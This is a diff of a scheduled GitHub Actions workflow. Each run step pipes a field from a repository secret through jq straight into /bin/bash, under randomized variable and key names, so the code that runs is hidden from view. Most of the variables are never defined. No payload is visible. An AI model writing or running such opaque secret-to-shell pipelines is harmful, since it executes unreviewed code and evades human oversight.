@@ -3,27 +3,30 @@ name: xushengtian4175
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
+    - cron: '39 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xushengtian4175
         env:
-          htkwf8: ${{ secrets.htkwf8 }}
+          d600: ${{ secrets.d600 }}
         run: |
-          echo $htkwf8 | jq -r .mny7501 | /bin/bash
-          echo $yx57 | jq -r .qb64 | /bin/bash
-          echo $f5 | jq -r .syqw30194 | /bin/bash
-          echo $tgz6875 | jq -r .ql19 | /bin/bash
-          echo $fkh2895 | jq -r .lfdrv194 | /bin/bash
-          echo $wusq31 | jq -r .g0879 | /bin/bash
-          echo $so2 | jq -r .yr552 | /bin/bash
-          echo $xqa21 | jq -r .xc90765 | /bin/bash
-          echo $iqk1607 | jq -r .ssx7 | /bin/bash
-          echo $or946 | jq -r .t53996 | /bin/bash
-          echo $ez7877 | jq -r .vyuis6 | /bin/bash
-          echo $b001 | jq -r .i3 | /bin/bash
+          echo $d600 | jq -r .md27 | /bin/bash
+          echo $kclqu3 | jq -r .bciq3 | /bin/bash
+          echo $yd5 | jq -r .rddy012 | /bin/bash
+          echo $ow26 | jq -r .j6 | /bin/bash
+          echo $kgf1082 | jq -r .zvlva612 | /bin/bash
+          echo $sbzd79120 | jq -r .s0341 | /bin/bash
+          echo $q58451 | jq -r .legr22523 | /bin/bash
+          echo $gluzc28776 | jq -r .qz086 | /bin/bash
+          echo $mbyu156 | jq -r .dkmos1 | /bin/bash
+          echo $vjmss782 | jq -r .g593 | /bin/bash
+          echo $uifgq50951 | jq -r .fltlz6 | /bin/bash
+          echo $hmiez5 | jq -r .mikn0 | /bin/bash
+          echo $n69 | jq -r .zugls29049 | /bin/bash
+          echo $rr80370 | jq -r .xjc668 | /bin/bash
+          echo $hiv4647 | jq -r .bzk4 | /bin/bash
 
